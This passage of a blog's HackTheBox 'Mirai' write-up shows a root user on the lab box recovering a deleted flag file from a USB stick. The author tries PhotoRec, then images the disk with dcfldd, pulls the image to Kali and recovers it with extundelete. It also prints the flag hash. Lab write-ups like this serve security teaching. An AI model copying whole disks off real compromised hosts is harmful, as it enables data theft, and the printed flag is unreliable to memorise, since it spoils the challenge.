+</pre><td class="rouge-code"><pre> root@raspberrypi:/tmp/testdisk# tar -xf testdisk-7.2-WIP.linux26.tar.bz2 
+</pre></table></code></div></div><li>Copy <code class="language-plaintext highlighter-rouge">photorec_static</code> into <code class="language-plaintext highlighter-rouge">/usr/local/sbin</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> root@raspberrypi:/tmp/testdisk/testdisk-7.2-WIP# cp photorec_static /usr/local/sbin/photorec
+</pre></table></code></div></div><li>Make <code class="language-plaintext highlighter-rouge">testdisk</code> executable<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> root@raspberrypi:/tmp/testdisk/testdisk-7.2-WIP# chmod +x /usr/local/sbin/photorec
+</pre></table></code></div></div></ol><li>Attempt to recover the deleted file w/ <code class="language-plaintext highlighter-rouge">photorec</code><ol><li>Execute <code class="language-plaintext highlighter-rouge">photorec</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre> root@raspberrypi:/tmp/testdisk/testdisk-7.2-WIP# sudo photorec
+		
+ # Use arrow keys to navigate
+ # Enter to select
+</pre></table></code></div></div><li>Select <code class="language-plaintext highlighter-rouge">/dev/sdb</code><li>Select <code class="language-plaintext highlighter-rouge">UNKNOWN - WHOLE DISK</code><li>Select <code class="language-plaintext highlighter-rouge">ext2/ext3</code><li>Select directory to save the recovered file, browse to <code class="language-plaintext highlighter-rouge">/tmp</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> # SHIFT + C to select directory
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Mirai/images/Pasted%20image%2020220916234605.png" alt="" data-proofer-ignore></p><li>View files in <code class="language-plaintext highlighter-rouge">recup_dir.1</code>, failed<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre> root@raspberrypi:/tmp/recup_dir.1# ls -la
+ total 8
+ drwxr-xr-x  2 root root   80 Sep 16 15:45 .
+ drwxrwxrwt 15 root root  400 Sep 16 15:45 ..
+ -rw-r--r--  1 root root  129 Sep 16 15:45 f0016470.txt
+ -rw-r--r--  1 root root 3175 Sep 16 15:45 report.xml
+ root@raspberrypi:/tmp/recup_dir.1# cat f0016470.txt 
+ Damnit! Sorry man I accidentally deleted your files off the USB stick.
+ Do you know if there is any way to get them back?
+		
+ -James
+ root@raspberrypi:/tmp/recup_dir.1# 
+</pre></table></code></div></div></ol></ol><h2 id="recovering-roottxt-w-extundelete">Recovering Root.txt w/ extundelete <a href="#recovering-roottxt-w-extundelete" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Recover the deleted file w/ <code class="language-plaintext highlighter-rouge">extundelete</code><ul><li><code class="language-plaintext highlighter-rouge">extundelete</code> - is a utility that can recover deleted files from an ext3 or ext4 partition.</ul><li>Tried to install <code class="language-plaintext highlighter-rouge">extundelete</code> on <code class="language-plaintext highlighter-rouge">mirai.htb</code>, failed<li>Install <code class="language-plaintext highlighter-rouge">extundelete</code> on <code class="language-plaintext highlighter-rouge">kali</code><ol><li>Download <a href="https://onboardcloud.dl.sourceforge.net/project/extundelete/extundelete/0.2.4/extundelete-0.2.4.tar.bz2"><code class="language-plaintext highlighter-rouge">extundelete</code></a><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete]
+ └─# wget https://onboardcloud.dl.sourceforge.net/project/extundelete/extundelete/0.2.4/extundelete-0.2.4.tar.bz2	
+</pre></table></code></div></div><li>Unzip<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete]
+ └─# tar -xf extundelete-0.2.4.tar.bz2 
+</pre></table></code></div></div><li>Install prerequisite library<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4]
+ └─# sudo apt-get install e2fslibs-dev
+</pre></table></code></div></div><li>Compile <code class="language-plaintext highlighter-rouge">extundelete</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4]
+ └─# chmod +x configure
+		
+ ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4]
+ └─# ./configure
+ Configuring extundelete 0.2.4
+ Writing generated files to disk
+		
+ ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4]
+ └─# make                                                                              
+ make -s all-recursive                                                                 
+ Making all in src                                                                     
+ insertionops.cc: In function ‘std::ostream&amp; operator&lt;&lt;(std::ostream&amp;, const ext2_inode&amp;)’:
+ insertionops.cc:36:36: error: ‘const struct ext2_inode’ has no member named ‘i_dir_acl’; did you mean ‘i_file_acl’?
+    36 |   os &lt;&lt; "Directory ACL: " &lt;&lt; inode.i_dir_acl &lt;&lt; std::endl;                    
+       |                                    ^~~~~~~~~
+       |                                    i_file_acl                                 
+ make[2]: *** [Makefile:437: extundelete-insertionops.o] Error 1                                                                                                             
+ make[1]: *** [Makefile:268: all-recursive] Error 1 
+</pre></table></code></div></div><li>Fix Errors - <a href="https://blog.csdn.net/weixin_44966641/article/details/121318227">Followed this guide</a><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4]
+ └─# wget https://sourceforge.net/p/extundelete/tickets/5/attachment/extundelete-0.2.4-e2fsprogs.patch.txt
+		
+ ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4]
+ └─# patch -p1&lt;extundelete-0.2.4-e2fsprogs.patch.txt 
+ patching file src/insertionops.cc    
+</pre></table></code></div></div><li>Compile again<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4]
+ └─# ./configure
+ Configuring extundelete 0.2.4
+ Writing generated files to disk
+		
+ ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/exploit/extundelete/extundelete-0.2.4]
+ └─# make &amp; make install
+ [1] 518198
+ make -s all-recursive
+ Making install in src
+ Making all in src
+   /usr/bin/install -c extundelete '/usr/local/bin'
+</pre></table></code></div></div></ol><li>Transfer <code class="language-plaintext highlighter-rouge">/dev/sdb</code> to <code class="language-plaintext highlighter-rouge">kali</code><ol><li>Create archive of <code class="language-plaintext highlighter-rouge">dev/sdb</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre> root@raspberrypi:/tmp# sudo dcfldd if=/dev/sdb | gzip -1 - | dcfldd of=usbstick.gz
+ 256 blocks (8Mb) written.
+ 320+0 records in
+ 320+0 records out
+		
+ 0+3 records in
+ 1+1 records out
+</pre></table></code></div></div><li>Transfer &amp; Extract on <code class="language-plaintext highlighter-rouge">kali</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot]
+ └─# wget mirai.htb:9090/usbstick.gz
+		
+ ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot]
+ └─# gzip -d usbstick.gz 
+		
+ ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot]
+ └─# file usbstick 
+ usbstick: Linux rev 1.0 ext4 filesystem data, UUID=635bcd7f-1d95-4229-bf13-3e722026db3c (extents) (huge files)
+</pre></table></code></div></div></ol><li>Attempt to recover the deleted file w/ <code class="language-plaintext highlighter-rouge">extundelete</code><ol><li>Attempt to restore everything on the filesystem<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot]
+ └─# extundelete --restore-all usbstick 
+ NOTICE: Extended attributes are not restored.
+ Loading filesystem metadata ... 2 groups loaded.
+ Loading journal descriptors ... 23 descriptors loaded.
+ Searching for recoverable inodes in directory / ... 
+ 1 recoverable inodes found.
+ Looking through the directory structure for deleted files ... 
+ 0 recoverable inodes still lost.
+</pre></table></code></div></div><li>View recovered files<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot]
+ └─# cd RECOVERED_FILES/
+ ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot/RECOVERED_FILES]
+ └─# ls
+ root.txt
+ ┌──(root💀kali)-[~/htb/mirai/10.10.10.48/loot/RECOVERED_FILES]
+ └─# cat root.txt 
+ 3d3e483143ff12ec505d026fa13e020b
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Mirai/images/Pasted%20image%2020220917011828.png" alt="" data-proofer-ignore></p></ol></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/hackthebox-linux/'>HackTheBox - Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/data-recovery/" class="post-tag no-text-decoration" >data-recovery</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Mirai - Yufong&amp;u=https://yufongg.github.io/posts/Mirai/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Blunder/"><div class="card-body"> <em class="timeago small" data-ts="1672502400" > 2023-01-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Blunder</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, discovering bludit CMS running, it is vulnerable to a bruteforce protection bypass, directory traversal + image upload exec vulnerability. With ce...</p></div></div></a></div><div class="card"> <a href="/posts/UpDown/"><div class="card-body"> <em class="timeago small" data-ts="1674403200" > 2023-01-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - UpDown</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, /dev/.git is discovered, since .git is found, we are able to view the logs and commits of the git repository, providing us w/ the header needed to...</p></div></div></a></div><div class="card"> <a href="/posts/MetaTwo/"><div class="card-body"> <em class="timeago small" data-ts="1682870400" > 2023-05-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - MetaTwo</h3><div class="text-muted small"><p> Overview The machine begins with a web enumeration which led to the discovery of a vulnerable version of WordPress 5.6.2 and a vulnerable plugin, Booking Press 1.0.10. The plugin Booking Press 1.0...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Jarvis/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - Jarvis</p></a> <a href="/posts/Unlock-Post/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Unlock Password Protected Post</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/Mirai/'; this.page.identifier = '/posts/Mirai/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
